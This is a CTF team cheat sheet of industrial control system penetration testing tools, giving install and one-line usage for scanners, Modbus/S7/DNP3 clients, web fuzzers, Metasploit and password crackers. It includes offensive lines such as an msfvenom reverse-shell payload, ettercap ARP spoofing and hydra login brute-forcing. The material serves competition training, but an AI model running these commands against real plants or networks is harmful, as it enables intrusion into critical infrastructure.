# Industrial CTF Tools Arsenal

**Authored by: Hex**

Team,

This is your complete ICS penetration testing toolkit. When seconds count and the industrial network is your battlefield, this comprehensive catalog gives you the precise tool and command for every situation. From network discovery to protocol manipulation, from HMI exploitation to PLC control - everything you need is here.

Speed. Precision. Victory.

---

## Network Discovery & Reconnaissance

| Tool | Purpose | Installation | Go-To Command Example |
| :--- | :--- | :--- | :--- |
| **Nmap** | Network/Port Scanning | `apt install nmap` | `nmap -sV -sC -p- <IP>` |
| **Masscan** | Ultra-fast Port Scanner | `apt install masscan` | `masscan -p1-10000 <IP_RANGE> --rate=1000` |
| **arp-scan** | Layer 2 Network Discovery | `apt install arp-scan` | `arp-scan -l` |
| **unicornscan** | Async Network Scanner | `apt install unicornscan` | `unicornscan -mT <IP>:1-1000` |

## ICS Protocol Tools

### Modbus Tools
| Tool | Purpose | Installation | Command Example |
| :--- | :--- | :--- | :--- |
| **modbus-cli** | Direct Modbus Interaction | `pip install modbus-cli` | `modbus-cli --host <IP> read-holding-registers 0 10` |
| **plcscan** | PLC Discovery & Fingerprinting | `git clone https://github.com/meeas/plcscan` | `python plcscan.py <IP_RANGE>` |
| **modbus-tools** | Modbus Utilities Suite | `apt install libmodbus-dev` | `modpoll -m tcp -a 1 -r 1 -c 10 <IP>` |

### Siemens S7 Tools
| Tool | Purpose | Installation | Command Example |
| :--- | :--- | :--- | :--- |
| **snap7** | S7 PLC Communication | `pip install python-snap7` | `python -c "import snap7; print('S7 Ready')"` |
| **s7-client** | S7 Protocol Client | `apt install libs7-dev` | Custom scripts (see Python section) |

### DNP3 & Utilities
| Tool | Purpose | Installation | Command Example |
| :--- | :--- | :--- | :--- |
| **dnp3-toolkit** | DNP3 Protocol Testing | Manual compilation required | `dnp3_master --help` |
| **aegis** | DNP3 Fuzzer | `git clone https://github.com/SCADACS/aegis` | `./aegis -t <IP> -p 20000` |

## Web Application Testing

| Tool | Purpose | Installation | Command Example |
| :--- | :--- | :--- | :--- |
| **Gobuster** | Directory/File Brute-Force | `apt install gobuster` | `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak` |
| **Nikto** | Web Vulnerability Scanner | `apt install nikto` | `nikto -h http://<IP>` |
| **dirb** | Web Content Scanner | `apt install dirb` | `dirb http://<IP> /usr/share/dirb/wordlists/common.txt` |
| **ffuf** | Fast Web Fuzzer | `go install github.com/ffuf/ffuf@latest` | `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<IP>/FUZZ` |
| **Burp Suite** | Web App Proxy & Analysis | Download from PortSwigger | `(GUI) - Intercept requests to analyze/modify` |
| **sqlmap** | SQL Injection Tool | `apt install sqlmap` | `sqlmap -u "http://<IP>/login.php" --forms --batch` |

## Network Analysis

| Tool | Purpose | Installation | Command Example |
| :--- | :--- | :--- | :--- |
| **Wireshark** | Network Protocol Analysis | `apt install wireshark` | `(GUI) - Display Filter: modbus` |
| **tshark** | Command-line Wireshark | `apt install tshark` | `tshark -i eth0 -f "port 502"` |
| **tcpdump** | Packet Capture | `apt install tcpdump` | `tcpdump -i eth0 port 502 -w modbus.pcap` |
| **ettercap** | Network Sniffer/MITM | `apt install ettercap-text-only` | `ettercap -T -M arp:remote /<IP>// /<IP>//` |
| **scapy** | Packet Manipulation | `pip install scapy` | `scapy` (Interactive mode) |

## Exploitation Frameworks

| Tool | Purpose | Installation | Command Example |
| :--- | :--- | :--- | :--- |
| **Metasploit** | Exploitation Framework | `apt install metasploit-framework` | `msfconsole -q -x "search modbus; use 0; show options"` |
| **searchsploit** | Exploit Database Search | `apt install exploitdb` | `searchsploit modbus` |
| **msfvenom** | Payload Generator | Included with Metasploit | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe` |

## Network Utilities

| Tool | Purpose | Installation | Command Example |
| :--- | :--- | :--- | :--- |
| **netcat** | Network Swiss Army Knife | `apt install netcat` | `nc -lvnp 4444` (Listener) |
| **socat** | Advanced Network Relay | `apt install socat` | `socat TCP-LISTEN:8080,fork TCP:<TARGET>:80` |
| **proxychains** | Proxy Tunneling | `apt install proxychains` | `proxychains nmap <IP>` |
| **sshuttle** | VPN over SSH | `pip install sshuttle` | `sshuttle -r user@<IP> 192.168.1.0/24` |

## Password Cracking

| Tool | Purpose | Installation | Command Example |
| :--- | :--- | :--- | :--- |
| **John the Ripper** | Password Cracking | `apt install john` | `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` |
| **Hashcat** | GPU Password Cracking | `apt install hashcat` | `hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt` |
| **hydra** | Network Login Brute-forcer | `apt install hydra` | `hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"` |
| **medusa** | Parallel Login Brute-forcer | `apt install medusa` | `medusa -h <IP> -u admin -P /usr/share/wordlists/rockyou.txt -M http` |
| **patator** | Multi-purpose Brute-forcer | `pip install patator` | `patator http_fuzz url=http://<IP>/login.php method=POST body='user=admin&pass=FILE0' 0=/usr/share/wordlists/rockyou.txt` |

## Specialized ICS Tools

| Tool | Purpose | Installation | Command Example |
| :--- | :--- | :--- | :--- |
| **icsmap** | ICS Device Discovery | `git clone https://github.com/tijldeneut/icsmap` | `python icsmap.py -i <IP>` |
| **plcscan** | Multi-Protocol PLC Scanner | `git clone https://github.com/meeas/plcscan` | `python plcscan.py <IP_RANGE>` |
| **isf** | Industrial Security Framework | `git clone https://github.com/dark-lbp/isf` | `python isf.py` |
| **redpoint** | ICS Exploitation Platform | `git clone https://github.com/digitalbond/Redpoint` | Various modules available |

---

## Tool Categories Quick Reference

### **🔍 Discovery Phase**
- **Network:** nmap, masscan, arp-scan
- **ICS:** plcscan, icsmap, nmap NSE scripts
- **Web:** gobuster, nikto, dirb

### **🔬 Analysis Phase**
- **Traffic:** wireshark, tshark, tcpdump
- **Protocols:** modbus-cli, snap7, dnp3-toolkit
- **Web:** burp suite, sqlmap

### **⚔️ Exploitation Phase**
- **Framework:** metasploit, isf
- **Password:** hydra, john, hashcat
- **Network:** netcat, socat, proxychains

### **🎯 ICS-Specific**
- **Modbus:** modbus-cli, plcscan, modbus-tools
- **S7:** snap7, s7-client
- **DNP3:** dnp3-toolkit, aegis
- **Multi-Protocol:** icsmap, isf

---

## Default ICS Ports Reference

| Protocol | Port | Service | Detection Command |
| :--- | :--- | :--- | :--- |
| **Modbus** | 502/tcp | Modbus/TCP | `nmap -p 502 --script modbus-discover <IP>` |
| **DNP3** | 20000/tcp | DNP3 | `nmap -p 20000 --script dnp3-info <IP>` |
| **S7** | 102/tcp | Siemens S7 | `nmap -p 102 --script s7-info <IP>` |
| **EtherNet/IP** | 44818/tcp | EtherNet/IP | `nmap -p 44818 --script enip-info <IP>` |
| **BACnet** | 47808/udp | Building Automation | `nmap -sU -p 47808 <IP>` |
| **IEC 61850 MMS** | 102/tcp | Power Systems | `nmap -p 102 <IP>` |
| **Profinet** | 34962-34964/tcp | Industrial Ethernet | `nmap -p 34962-34964 <IP>` |
| **OPC Classic** | 135/tcp | OPC Server | `nmap -p 135 --script rpc-grind <IP>` |

---

*Remember: Speed and precision win competitions. Know your tools, trust your instincts, and execute flawlessly.*